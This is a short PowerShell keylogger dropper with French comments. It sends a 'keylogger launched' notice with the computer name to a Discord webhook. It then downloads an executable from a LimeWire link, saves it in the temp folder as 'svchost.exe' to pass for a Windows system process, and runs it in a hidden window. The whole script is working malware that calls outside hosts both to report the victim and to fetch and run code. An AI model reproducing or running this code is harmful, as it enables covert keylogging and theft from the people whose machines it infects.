$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'

iwr $webhook -Method Post -Body (@{content="Keylogger lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

# Télécharge ton .exe parfait depuis LimeWire et le lance
iwr 'https://limewire.com/d/8fkqv#TRo9XUAhOT' -OutFile "$env:TEMP\svchost.exe"
Start-Process "$env:TEMP\svchost.exe" -WindowStyle Hidden
